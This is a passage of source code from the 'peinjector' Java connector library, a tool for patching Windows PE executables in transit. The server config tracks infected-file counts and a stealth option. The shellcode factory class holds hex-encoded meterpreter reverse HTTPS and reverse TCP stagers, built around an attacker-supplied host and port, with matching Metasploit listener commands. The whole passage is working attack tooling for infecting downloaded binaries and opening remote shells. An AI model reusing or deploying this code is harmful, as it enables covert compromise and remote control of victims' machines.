	 * Call {@link #cmdSendGetConfig()} and parse with {@link LibPeServerConfig}!
	 * 
	 * @throws LibPeProtocolException if the control protocol is corrupt
	 * @throws LibPeSocketException if timeout expires before connecting, or if the IP address of the host could not be determined, or if an I/O error occurs when creating the socket 
	 */
	public LibPeServerConfig cmdSendGetConfigAndParse() throws LibPeProtocolException, LibPeSocketException {
		String serverconfigini = cmdSendGetConfig();
		return new LibPeServerConfig(serverconfigini);
	}

	
	
}

```

`peinjector/connectors/java/eu/peinjector/libpe/LibPeDataProtocol.java`:

```java
package eu.peinjector.libpe;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;

import eu.peinjector.libpe.exceptions.LibPeSocketException;

/**
 * The data protocol to for the pe-header and the patches.
 * 
 * <pre>
 *  SEND TO PE_INJECTOR SERVER (pe header):
 *     0               32                              n
 *     +---------------+-------------------------------+
 *     |               |                               |
 *     |     token     | first 4096 bytes of the file  |
 *     |               |  (with the pe header inside)  |
 *     +---------------+-------------------------------+
 * </pre>
 * 
 * <pre>
 *  RECEIVE FROM PE_INJECTOR SERVER (patch):
 *     +------------+------------+------------+----    +-----------+      
 *     | PATCH PART | PATCH PART | PATCH PART | .....  | 000000000 |    
 *     +------------+------------+------------+----    +-----------+  
 * </pre>
 * 
 * @see LibPePatch
 */
public class LibPeDataProtocol {
	
	
	// Class variables
	// ------------------------------------------------------------------------------
	private LibPeControlProtocol control = null;

	
	// Constructors
	// ------------------------------------------------------------------------------
	/**
	 * The {@link LibPeDataProtocol} use the server address, the port and the token from the {@link LibPeControlProtocol} to communicate.
	 */
	public LibPeDataProtocol(LibPeControlProtocol control) {
		super();
		
		if(null == control) {
			throw new NullPointerException("control is null");
		}
		
		this.control = control;
	}

	
	// communication
	// ------------------------------------------------------------------------------
	/**
	 * Send the file header to the pe-injector and return a patch to manipulate the file.<br>
	 * (use the first 4096 byte of the file)
	 * 
	 * @param fileheader {@link #readFileheader(String)}
	 * @return {@link LibPePatch}
	 * 
	 * @throws LibPeSocketException if timeout expires before connecting, or if the IP address of the host could not be determined, or if an I/O error occurs when creating the socket
	 */
	public LibPePatch getPatchFromPEinjector(byte[] fileheader) throws LibPeSocketException {
		// value is not null
		if(null == fileheader) {
			fileheader = new byte[0];
		}
		
		// connect to server
		InetSocketAddress socketAddress = new InetSocketAddress(this.control.getServerAddress(), this.control.getDataPort());
		Socket socket = new Socket();
		byte[] response = new byte[8192];
		int received = 0;
		try {
			socket.connect(socketAddress, 3000);
	
			// build send data
			ByteArrayOutputStream baos = new ByteArrayOutputStream();
			baos.write(control.getToken());	// send token (32 byte)
			baos.write(fileheader);			// send file header (n byte)
			
			// SEND
			OutputStream out = socket.getOutputStream();
			out.write(baos.toByteArray());
			out.flush();
	
			// RECIVE DATA
			InputStream in = socket.getInputStream();
			received = in.read(response);
			
		} catch(Exception e) {
			throw new LibPeSocketException(e.getMessage());
			
		} finally {
			try {
				socket.close();		// CLOSE SOCKET
			} catch (Exception e2) {
			}
		}
		
		// copy the received body (patch) in a new array
		byte[] serializedPatch = new byte[received];
		for(int i=0; i<(received); i++) {
			serializedPatch[i] = response[i];
		}
		
		// return patch
		return new LibPePatch(serializedPatch);
	}

	
}

```

`peinjector/connectors/java/eu/peinjector/libpe/LibPePatch.java`:

```java
package eu.peinjector.libpe;

import java.nio.ByteBuffer;
import java.nio.ByteOrder;

/**
 * <p>Provides de-serialization and in-stream patch applying capabilities for PE Files</p>
 * <pre>
 *     +---------------------------------------------+
 *     |                 PATCH PART                  |
 *     +---------------------------------------------+       
 *     |                                             |       
 *     | +---------+----------+--------+-----------+ |       
 *     | | MEMSIZE | POSITION | INSERT | PATCH-MEM | |       
 *     | +-----------------------------------------+ |       
 *     | | uint32  |  uint32  | uint8  | MEMSIZE   | | 
 *     | | (4bit)  |  (4bit)  | (1bit) | (n bit)   | |
 *     | +         +          +        +           + |       
 *     |                                             |       
 *     +---------------------------------------------+       
 *            |                                                     
 *            v                                                     
 *     +------------+------------+------------+----    +-----------+      
 *     | PATCH PART | PATCH PART | PATCH PART | .....  | 000000000 |    
 *     +------------+------------+------------+----    +-----------+  
 * 
 *     MEMSIZE: the size of the PATCH-MEM feld
 *     POSITION: the position of this PATCH PART in the stream
 *     INSERT: 0 ... override the bytes in the stream
 *             1 ... insert new bytes in the stream
 * </pre>
 * 
 * @see LibPeDataProtocol
 */
public class LibPePatch {

	
	// Class variables
	// ------------------------------------------------------------------------------
	/** 
	 * <p>Sentinel size: The min size of a valid PATCH PART<br>
	 * 4bit MEMSIZE + 4bit POSITION + 1bit INSERT</p>
	 * 
	 * <p>000000000 == END of the PATCH (last PATCH PART)</p>
	 */
	private final static int PEPATCH_SENTINELSIZE = 9;

	/** 
	 * First part of patch chain 
	 */
	private PatchPart first = null;

	
	// Constructors
	// ------------------------------------------------------------------------------
	/**
	 * Create a new {@link LibPePatch} object with a serialized patch
	 * @param serializedPatch
	 */
	public LibPePatch(byte[] serializedPatch) {
		if(null == serializedPatch) {
			serializedPatch = new byte[0];
		}
		
		int position = 0;
		byte[] patch_mem;
		int patch_memsize = 0;
		int patch_position = 0;
		boolean patch_insert = false;
		PatchPart current = null;
		PatchPart patch = null;

		/* Deserialize data */
		while ((serializedPatch.length - position) >= LibPePatch.PEPATCH_SENTINELSIZE) {
			patch_memsize = byte2int(serializedPatch, position);
			patch_position = byte2int(serializedPatch, position + 4);
			patch_insert = (serializedPatch[position + 8] != 0);
			position += 9;

			/* Length Error */
			if ((serializedPatch.length - position) < patch_memsize) {
				first = null;
				return;
			}

			/* Add patch */
			if (patch_memsize > 0) {
				patch_mem = new byte[patch_memsize];
				System.arraycopy(serializedPatch, position, patch_mem, 0,
						patch_memsize);
				patch = new PatchPart(patch_mem, patch_position, patch_insert);
			} else {
				patch = null;
			}

			/* Change position */
			position += patch_memsize;

			/* Build chain */
			if (current != null) {
				current.next = patch;
			}
			if (this.first == null) {
				this.first = patch;
			}
			current = patch;
		}

		/* Length Error */
		if ((serializedPatch.length - position) > 0) {
			first = null;
			return;
		}
	}

	
	// public methods
	// ------------------------------------------------------------------------------
	/**
	 *  <p>Applied patch on received bytes</p>
	 *  
	 *  <p><u>Attention:</u> the manipulated block may be larger than the old one</p>
	 *  
	 *  @param mem the received part of the pe-file
	 *  @param position the position of mem[0] in the pe-file
	 */
	public byte[] applyPatch(byte[] mem, int position) {
		if(null == mem) {
			mem = new byte[0];
		}
		
		byte[] new_mem = mem;
		byte[] insert_mem = null;
		PatchPart current = this.first;
		int delta_position;
		boolean all_finished = true;

		/* Nothing to do */
		if (current == null) {
			return new_mem;
		}

		/* For each patch part */
		while (current != null) {

			/* Finished, no need to check */
			if (current.finished) {
				current = current.next;
				continue;
			}

			/* start position of current patch part in stream memory */
			if ((current.position >= position)
					&& (current.position < (position + new_mem.length))) {
				/* delta memory position */
				delta_position = current.position - position;

				/* Insert memory */
				if (current.insert) {
					insert_mem = new byte[new_mem.length + current.mem.length];
					/* Insert old memory */
					System.arraycopy(new_mem, 0, insert_mem, 0, delta_position);
					System.arraycopy(new_mem, delta_position, insert_mem,
							delta_position + current.mem.length, new_mem.length
									- delta_position);

					/* Insert patch */
					System.arraycopy(current.mem, 0, insert_mem,
							delta_position, current.mem.length);

					/* Set new memory */
					new_mem = insert_mem;

					/* Patch part finished */
					current.finished = true;

					/* Overwrite */
				} else {
					System.arraycopy(
							current.mem,
							0,
							new_mem,
							delta_position,
							min(current.mem.length, new_mem.length
									- delta_position));
				}

				/* Patch applied */
				all_finished = false;

				/*
				 * Append after current mem part (important if current part is
				 * the last part)
				 */
			} else if (current.insert
					&& (current.position == (position + new_mem.length))) {
				insert_mem = new byte[new_mem.length + current.mem.length];
				/* Insert old memory */
				System.arraycopy(new_mem, 0, insert_mem, 0, new_mem.length);
				/* Insert patch */
				System.arraycopy(current.mem, 0, insert_mem, new_mem.length,
						current.mem.length);

				/* Set new memory */
				new_mem = insert_mem;

				/* Patch part finished */
				current.finished = true;

				/* Patch applied */
				all_finished = false;

				/*
				 * end position of current patch part in stream memory or patch
				 * part bigger than stream memory
				 */
			} else if (!current.insert
					&& ((current.position + current.mem.length) > position)
					&& (current.position < position)) {
				/* delta memory position */
				delta_position = position - current.position;
				System.arraycopy(
						current.mem,
						delta_position,
						new_mem,
						0,
						min(current.mem.length - delta_position, new_mem.length));

				/* Patch applied */
				all_finished = false;

				/* Patch finished */
			} else if ((current.position + current.mem.length) < position) {
				current.finished = true;

				/* Reset total finished */
			} else {
				/* Patch waiting */
				all_finished = false;
			}

			/* Next patch part */
			current = current.next;
		}

		/* Patch finished */
		if (all_finished) {
			this.first = null;
		}

		return new_mem;
	}

	
	// private methods
	// ------------------------------------------------------------------------------
	/** 
	 * @return min(a,b) 
	 */
	private int min(int a, int b) {
		return (a < b) ? a : b;
	}

	/**
	 *  Makes Integer from byte-array at given offset 
	 */
	private int byte2int(byte[] data, int position) {
		return ByteBuffer.wrap(data,position,4).order(ByteOrder.LITTLE_ENDIAN).getInt();
	}
	
	
	// inner class
	// ------------------------------------------------------------------------------
	/** 
	 * inner class to manage a PATCH PART
	 * 
	 * @see LibPePatch
	 */
	private class PatchPart {
		byte[] mem;
		int position;
		boolean insert;
		PatchPart next;
		boolean finished;

		PatchPart(byte[] mem, int position, boolean insert) {
			this.mem = mem;
			this.position = position;
			this.insert = insert;
			this.finished = false;
		}

	}
	
}

```

`peinjector/connectors/java/eu/peinjector/libpe/LibPeServerConfig.java`:

```java
package eu.peinjector.libpe;

import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.Properties;

/**
 * This class interprets the config-string returned by the server.
 */
public class LibPeServerConfig {

	
	// Class variables
	// ------------------------------------------------------------------------------
	private Properties config = new Properties();
	/**
	 * The original string that came back from the server.
	 */
	public final String originalServerIni;
	/**
	 * <b>true:</b> The configuration has been successfully loaded and contains values.<br>
	 * <b>false:</b> The configuration is empty. There are returned invalid values.<br>
	 */
	public final boolean validConfig;
	
	
	// Constructors
	// ------------------------------------------------------------------------------
	/**
	 * Interprets the string as INI configuration
	 */
	public LibPeServerConfig(String serverconfigini) {
		// set originalServerIni String
		this.originalServerIni = serverconfigini;
		
		// load Properties
		if (null != serverconfigini) {
			try {
				InputStream stream = new ByteArrayInputStream(serverconfigini.getBytes(StandardCharsets.UTF_8));
				config.load(stream);
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
		
		// is valid config (maybe)?
		if(!config.isEmpty()) {
			// is NOT empty -> OK
			validConfig = true;
		}else {
			// is empty  :*(
			validConfig = false;
		}
	}

	
	// general (intern) methods
	// ------------------------------------------------------------------------------
	/**
	 * convert and return the option as boolean
	 * @return true (value=1 or value=true)
	 */
	private boolean getBoolean(String key) {
		Object value = config.get(key);
		if(value == null) {
			System.err.println(LibPeServerConfig.class +": '"+ key +"' not found!");
			return false;
		} else {
			if(value.toString().equals("1") || value.toString().toLowerCase().equals("true")) {
				return true;
			} else {
				return false;
			}
		}
	}
	
	/**
	 * convert and return the option as string
	 * @return value (null -> "")
	 */
	private String getString(String key) {
		Object value = config.get(key);
		if(value == null) {
			System.err.println(LibPeServerConfig.class +": '"+ key +"' not found!");
			return "";
		} else {
			return value.toString();
		}
	}
	
	/**
	 * convert and return the option as integer
	 * @param key
	 * @return
	 */
	private int getInt(String key) {
		Object value = config.get(key);
		if(value == null) {
			System.err.println(LibPeServerConfig.class +": '"+ key +"' not found!");
			return 0;
		} else {
			try {
				return Integer.valueOf(value.toString());
			} catch (Exception e) {
				return 0;
			}
		}
	}
	
	
	// Getter and Setter
	// ------------------------------------------------------------------------------
	/**
	 * @see LibPeControlProtocol#cmdSendSetRandomSectionName(boolean)
	 */
	public boolean isSection_name_random() {
		return getBoolean("section_name_random");
	}

	/**
	 * @see LibPeControlProtocol#cmdSendSetPayloadNameX86(String)
	 */
	public String getPayload_name_x86() {
		return getString("payload_name_x86");
	}

	/**
	 * @see LibPeControlProtocol#cmdSendSetPayloadNameX64(String)
	 */
	public String getPayload_name_x64() {
		return getString("payload_name_x64");
	}

	/**
	 * @see LibPeControlProtocol#cmdSendSetMethodAlignment(boolean)
	 */
	public boolean isMethod_alignment() {
		return getBoolean("method_alignment");
	}

	/**
	 * @see LibPeControlProtocol#cmdSendSetMethodAlignmentResize(boolean)
	 */
	public boolean isMethod_alignment_resize() {
		return getBoolean("method_alignment_resize");
	}

	/**
	 * @see LibPeControlProtocol#cmdSendSetMethodNewSection(boolean)
	 */
	public boolean isMethod_new_section() {
		return getBoolean("method_new_section");
	}

	/**
	 * @see LibPeControlProtocol#cmdSendSetMethodChangeFlags(boolean)
	 */
	public boolean isMethod_change_flags() {
		return getBoolean("method_change_flags");
	}

	/**
	 * @see LibPeControlProtocol#cmdSendSetMethodCrossSectionJump(boolean)
	 */
	public boolean isMethod_cross_section_jump() {
		return getBoolean("method_cross_section_jump");
	}

	/**
	 * @see LibPeControlProtocol#cmdSendSetMethodCrossSectionJumpIterations(int)
	 */
	public int getMethod_cross_section_jump_iterations() {
		return getInt("method_cross_section_jump_iterations");
	}

	/**
	 * @see LibPeControlProtocol#cmdSendSetEncrypt(boolean)
	 */
	public boolean isEncrypt() {
		return getBoolean("encrypt");
	}

	/**
	 * @see LibPeControlProtocol#cmdSendSetEncryptIterations(int)
	 */
	public int getEncrypt_iterations() {
		return getInt("encrypt_iterations");
	}

	/**
	 * @see LibPeControlProtocol#cmdSendSetRemoveIntegrityCheck(boolean)
	 */
	public boolean isRemove_integrity_check() {
		return getBoolean("remove_integrity_check");
	}

	/**
	 * @see LibPeControlProtocol#cmdSendSetTryStayStealth(boolean)
	 */
	public boolean isTry_stay_stealth() {
		return getBoolean("try_stay_stealth");
	}

	/**
	 * @see LibPeControlProtocol#cmdSendSetEnable(boolean)
	 */
	public boolean isEnable() {
		return getBoolean("enable");
	}

	/**
	 * If this value is true, then no port can be changed. 
	 * (server-side locked)
	 */
	public boolean isPersistent_ports() {
		return getBoolean("persistent_ports");
	}

	/**
	 * return the token (byte[]) as HEX-String
	 * @see LibPeControlProtocol#cmdSendSetToken(byte[])
	 */
	public String getToken() {
		return getString("token");
	}

	/**
	 * @see LibPeControlProtocol#cmdSendSetDataPort(int)
	 * @see #isPersistent_ports()
	 */
	public int getData_port() {
		return getInt("data_port");
	}

	/**
	 * @see LibPeControlProtocol#cmdSendSetDataInterface(boolean)
	 */
	public boolean isData_interface() {
		return getBoolean("data_interface");
	}

	/**
	 * @see LibPeControlProtocol#cmdSendSetControlPort(int)
	 * @see #isPersistent_ports()
	 */
	public int getControl_port() {
		return getInt("control_port");
	}

	/**
	 * @see LibPeControlProtocol#cmdSendSetControlInterface(boolean)
	 */
	public boolean isControl_interface() {
		return getBoolean("control_interface");
	}

	/**
	 * Returns the number of infected files. (x86)
	 */
	public int getInfection_counter_x86() {
		return getInt("infection_counter_x86");
	}

	/**
	 * Returns the number of infected files. (x64)
	 */
	public int getInfection_counter_x64() {
		return getInt("infection_counter_x64");
	}

}

```

`peinjector/connectors/java/eu/peinjector/libpe/LibPeShellcodeFactory.java`:

```java
package eu.peinjector.libpe;

import java.io.ByteArrayOutputStream;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;

import javax.xml.bind.DatatypeConverter;

/*
	Copyright (c) 2013-2015, Joshua Pitts
	All rights reserved.
	
	Redistribution and use in source and binary forms, with or without modification,
	are permitted provided that the following conditions are met:
	
	    1. Redistributions of source code must retain the above copyright notice,
	    this list of conditions and the following disclaimer.
	
	    2. Redistributions in binary form must reproduce the above copyright notice,
	    this list of conditions and the following disclaimer in the documentation
	    and/or other materials provided with the distribution.
	
	    3. Neither the name of the copyright holder nor the names of its contributors
	    may be used to endorse or promote products derived from this software without
	    specific prior written permission.
	
	THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
	AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
	IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
	ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
	LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
	CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
	SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
	INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
	CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
	ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
	POSSIBILITY OF SUCH DAMAGE.
*/

/**
 * This class provides shellcode factories
 */
public class LibPeShellcodeFactory {

	
	// general methods
	// ------------------------------------------------------------------------------
	/**
	 * Returns the raw IP address of this InetAddress object. 
	 * The result is in network byte order: the highest order byte of the address is in getAddress()[0].
	 * 
	 * <p>resolve hostnames!!!</p>
	 * 
	 * @return an IP address for the given host name. 
	 */
	private static byte[] pack_ip_addresses(String ip) {
		try {
			InetAddress ia_ip = InetAddress.getByName(ip);
			byte[] bytes = ia_ip.getAddress();
			return bytes;
			
		} catch (UnknownHostException e) {
			e.printStackTrace();
			return new byte[4];
		}
	}
	
	/**
	 * convert the port into byte-array<br>
	 * network (= big-endian)<br>
	 * unsigned short (2byte)
	 */
	private static byte[] pack_port(int port, ByteOrder bo) {
		byte[] tmp = ByteBuffer.allocate(4).order(bo).putInt(port).array();
		if(ByteOrder.BIG_ENDIAN == bo) {
			return new byte[] {tmp[2],tmp[3]};
		}else {
			return new byte[] {tmp[0],tmp[1]};
		}
	}
		

	// shellcode
	// ------------------------------------------------------------------------------
	/**
	 * <p>Traditional meterpreter reverse https shellcode. Will try to connect to the given host:port. 
	 * Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Tunnel 
	 * communication over HTTPS (Windows wininet) The port must be between 1 and 65535.</p>
	 * 
	 * <p><u>references</u><br>
	 * https://github.com/stephenfewer/ReflectiveDLLInjection<br>
	 * https://github.com/rapid7/ReflectiveDLLInjection</p>
	 * 
	 * <p><u>listen commands</u><br>
	 * msf > use payload/windows/meterpreter/reverse_https<br>
	 * msf payload(reverse_https) > set lhost 0.0.0.0<br>
	 * msf payload(reverse_https) > set lport 1337<br>
	 * msf payload(reverse_https) > run</p>
	 * 
	 * (for 32bit OS)
	 * 
	 * @param host ip or hostname
	 * @param port Port
	 */
	public static byte[] meterpreter_reverse_https_threaded_x86(String host, int port) {
		// params
		byte[] port_byte = pack_port(port, ByteOrder.LITTLE_ENDIAN);

		try {
			// ByteArrayOutputStream
			ByteArrayOutputStream shellcode = new ByteArrayOutputStream();
			ByteArrayOutputStream shellcode1 = new ByteArrayOutputStream();
			ByteArrayOutputStream shellcode2 = new ByteArrayOutputStream();

			// shellcode2
			shellcode2.write(DatatypeConverter.parseHexBinary("E8B7FFFFFFfce8890000006089e531d2648b52308b520c8b52148b72"
					+ "280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b5820"
					+ "01d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b04"
					+ "8b01d0894424245b5b61595a51ffe0585f5a8b12eb865d686e6574006877696e6954684c772607ffd531ff575757576a00"
					+ "54683a5679a7ffd5eb5f5b31c951516a03515168"));
			shellcode2.write(port_byte); // PORT
			shellcode2.write(DatatypeConverter.parseHexBinary("000053506857899fc6ffd5eb485931d252680032a084525252515250"
					+ "68eb552e3bffd589c66a105b688033000089e06a04506a1f566875469e86ffd531ff5757575756682d06187bffd585c0"
					+ "751a4b7410ebd5eb49e8b3ffffff2f48455679000068f0b5a256ffd56a4068001000006800004000576858a453e5ffd5"
					+ "93535389e7576800200000535668129689e2ffd585c074cd8b0701c385c075e558c3e851ffffff"));
			shellcode2.write(host.getBytes()); // HOST
			shellcode2.write(DatatypeConverter.parseHexBinary("00"));

			// shellcode1 is the thread
			shellcode1.write(DatatypeConverter.parseHexBinary("9090609CFC90E8C10000006089E531D290648B52308B520C8B5214EB"
					+ "0241108B72280FB74A2631FF31C0AC3C617C022C20C1CF0D01C74975EF5290578B5210908B423C01D0908B4078EB07EA"
					+ "484204857C3A85C00F84680000009001D050908B48188B582001D3E358498B348B01D631FF9031C0EB04FF69D538ACC1"
					+ "CF0D01C738E0EB057F1BD2EBCA75E6037DF83B7D2475D458908B582401D390668B0C4B8B581C01D390EB04CD97F1B18B"
					+ "048B01D090894424245B5B6190595A51EB010FFFE058905F5A8B12E953FFFFFF905D90BE"));
			shellcode1.write(pack_port(shellcode2.size()-5, ByteOrder.LITTLE_ENDIAN));
			shellcode1.write(DatatypeConverter.parseHexBinary("0000906A4090680010000056906A006858A453E5FFD589C389C79089"
					+ "F1eb44905e909090F2A4E820000000BBE01D2A0A9068A695BD9DFFD53C067C0A80FBE07505BB4713726F6A0053FFD531"
					+ "C05050505350506838680D16FFD558589061E9"));
			shellcode1.write(ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt(shellcode2.size()).array());

			// return shellcode
			shellcode.write(shellcode1.toByteArray());
			shellcode.write(shellcode2.toByteArray());
			return shellcode.toByteArray();

		} catch (Exception e) {
			e.printStackTrace();
			return new byte[0];
		}
	}
	
	/**
	 * <p>Traditional meterpreter reverse https shellcode. Will try to connect to the given host:port. 
	 * Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Tunnel 
	 * communication over HTTPS (Windows wininet) The port must be between 1 and 65535.</p>
	 * 
	 * <p><u>references</u><br>
	 * https://github.com/stephenfewer/ReflectiveDLLInjection<br>
	 * https://github.com/rapid7/ReflectiveDLLInjection</p>
	 * 
	 * <p><u>listen commands</u><br>
	 * msf > use payload/windows/meterpreter/reverse_https<br>
	 * msf payload(reverse_https) > set lhost 0.0.0.0<br>
	 * msf payload(reverse_https) > set lport 1337<br>
	 * msf payload(reverse_https) > run</p>
	 * 
	 * (for 64bit OS)
	 * 
	 * @param host ip or hostname
	 * @param port Port
	 */
	public static byte[] meterpreter_reverse_https_threaded_x64(String host, int port) {
		// params
		byte[] port_byte = pack_port(port, ByteOrder.LITTLE_ENDIAN);

		try {
			// ByteArrayOutputStream
			ByteArrayOutputStream shellcode = new ByteArrayOutputStream();
			ByteArrayOutputStream shellcode1 = new ByteArrayOutputStream();
			ByteArrayOutputStream shellcode2 = new ByteArrayOutputStream();

			// shellcode2
			shellcode2.write(DatatypeConverter.parseHexBinary("E8B8FFFFFFfc4883e4f0e8c8000000415141505251564831d265488b" +
					"5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b" +
					"423c4801d0668178180b0275728b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801" +
					"d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0" +
					"418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e94fffffff5d6a0049be77696e69" +
					"6e65740041564989e64c89f149ba4c77260700000000ffd56a006a004889e14831d24d31c04d31c94150415049ba3a5679" +
					"a700000000ffd5e99e0000005a4889c149b8"));
			shellcode2.write(port_byte); // PORT
			shellcode2.write(DatatypeConverter.parseHexBinary("0000000000004d31c9415141516a03415149ba57899fc600000000ff" +
					"d5eb7c4889c14831d241584d31c952680032a084525249baeb552e3b00000000ffd54889c66a0a5f4889f148ba1f000000" +
					"000000006a0068803300004989e049b9040000000000000049ba75469e8600000000ffd54889f14831d24d31c04d31c952" +
					"5249ba2d06187b00000000ffd585c0752448ffcf7413ebb1e981000000e87fffffff2f75474858000049bef0b5a2560000" +
					"0000ffd54831c948ba000040000000000049b8001000000000000049b9400000000000000049ba58a453e500000000ffd5" +
					"489353534889e74889f14889da49b800200000000000004989f949ba129689e200000000ffd54883c42085c07499488b07" +
					"4801c34885c075ce5858c3e8d7feffff"));
			shellcode2.write(host.getBytes()); // HOST
			shellcode2.write(DatatypeConverter.parseHexBinary("00"));
			
			//shellcode1 is the thread
			shellcode1.write(DatatypeConverter.parseHexBinary("9050535152565755415041514152415341544155415641579c90e8c0" +
					"000000415141505251564831D265488B5260488B5218488B5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041" +
					"c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648" +
					"ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c" +
					"48448b401c4901d0418b04884801d0415841585E595A41584159415A4883EC204152FFE05841595A488B12e957ffffff5d" +
					"49c7c6"));
			shellcode1.write(pack_port(shellcode2.size()-5, ByteOrder.LITTLE_ENDIAN));
			shellcode1.write(DatatypeConverter.parseHexBinary("00006a404159680010000041584C89F26A00596858a453e5415Affd5" +
					"4889c34889c748c7c1"));
			shellcode1.write(pack_port(shellcode2.size()-5, ByteOrder.LITTLE_ENDIAN));
			shellcode1.write(DatatypeConverter.parseHexBinary("0000eb435ef2a4e8000000004831C050504989C14889C24989D84889" +
					"C149C7C238680D16FFD54883C4589d415f415e415d415c415b415a415941585d5f5e5a595b58E9"));
			shellcode1.write(ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt(shellcode2.size()).array());
			
			// return shellcode
			shellcode.write(shellcode1.toByteArray());
			shellcode.write(shellcode2.toByteArray());
			return shellcode.toByteArray();
			
		} catch (Exception e) {
			e.printStackTrace();
			return new byte[0];
		}
	}

	/**
	 * <p>Reverse tcp stager which will try to connect to the given host:port. 
	 * Can be used with windows/shell/reverse_tcp or windows/meterpreter/reverse_tcp 
	 * payloads from metasploit. Host must be an IPv4 address, the port must be between 1 and 65535.</p>
	 * 
	 * <p><u>references</u><br>
	 * https://github.com/stephenfewer/ReflectiveDLLInjection<br>
	 * https://github.com/rapid7/ReflectiveDLLInjection</p>
	 * 
	 * <p><u>listen commands</u><br>
	 * msf > use payload/windows/meterpreter/reverse_tcp<br>
	 * msf payload(reverse_tcp) > set lhost 0.0.0.0<br>
	 * msf payload(reverse_tcp) > set lport 1337<br>
	 * msf payload(reverse_tcp) > run</p>
	 * 
	 * (for 32bit OS)
	 * 
	 * @param ip ipv4 address
	 * @param port Port
	 */
	public static byte[] reverse_tcp_stager_threaded_x86(String ip, int port) {
		// params
		byte[] ip_byte = pack_ip_addresses(ip);
		byte[] port_byte = pack_port(port, ByteOrder.BIG_ENDIAN);
		
		// shellcode
		try {
			ByteArrayOutputStream shellcode = new ByteArrayOutputStream();
			shellcode.write(DatatypeConverter.parseHexBinary("9090609cfc90e8c10000006089e531d290648b52308b520c8b5214eb0"
					+ "241108b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c74975ef5290578b5210908b423c01d0908b4078eb07ea4"
					+ "84204857c3a85c00f84680000009001d050908b48188b582001d3e358498b348b01d631ff9031c0eb04ff69d538acc1c"
					+ "f0d01c738e0eb057f1bd2ebca75e6037df83b7d2475d458908b582401d390668b0c4b8b581c01d390eb04cd97f1b18b0"
					+ "48b01d090894424245b5b6190595a51eb010fffe058905f5a8b12e953ffffff905d90be22010000906a4090680010000"
					+ "056906a006858a453e5ffd589c389c79089f1eb44905e909090f2a4e820000000bbe01d2a0a9068a695bd9dffd53c067"
					+ "c0a80fbe07505bb4713726f6a0053ffd531c05050505350506838680d16ffd558589061e927010000e8b7fffffffce88"
					+ "90000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b521"
					+ "08b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df"
					+ "83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865d68333"
					+ "20000687773325f54684c772607ffd5b89001000029c454506829806b00ffd5505050504050405068ea0fdfe0ffd5976"
					+ "a0568"));
			shellcode.write(ip_byte);	//ip
			shellcode.write(DatatypeConverter.parseHexBinary("680200"));
			shellcode.write(port_byte);	//port
			shellcode.write(DatatypeConverter.parseHexBinary("89e66a1056576899a57461ffd585c0740cff4e0875ec68f0b5a256ffd"
					+ "56a006a0456576802d9c85fffd58b366a406800100000566a006858a453e5ffd593536a005653576802d9c85fffd501c"
					+ "329c685f675ecc3"));
			return shellcode.toByteArray();
			
		} catch (Exception e) {
			e.printStackTrace();
			return new byte[0];
		}
	}
	
	/**
	 * <p>Reverse tcp stager which will try to connect to the given host:port. 
	 * Can be used with windows/shell/reverse_tcp or windows/meterpreter/reverse_tcp 
	 * payloads from metasploit. Host must be an IPv4 address, the port must be between 1 and 65535.</p>
	 * 
	 * <p><u>references</u><br>
	 * https://github.com/stephenfewer/ReflectiveDLLInjection<br>
	 * https://github.com/rapid7/ReflectiveDLLInjection</p>
	 * 
	 * <p><u>listen commands</u><br>
	 * msf > use payload/windows/meterpreter/reverse_tcp<br>
	 * msf payload(reverse_tcp) > set lhost 0.0.0.0<br>
	 * msf payload(reverse_tcp) > set lport 1337<br>
	 * msf payload(reverse_tcp) > run</p>
	 * 
	 * (for 64bit OS)
	 * 
	 * @param ip ipv4 address
	 * @param port Port
	 */
	public static byte[] reverse_tcp_stager_threaded_x64(String ip, int port) {
		// params
		byte[] ip_byte = pack_ip_addresses(ip);
		byte[] port_byte = pack_port(port, ByteOrder.BIG_ENDIAN);
		
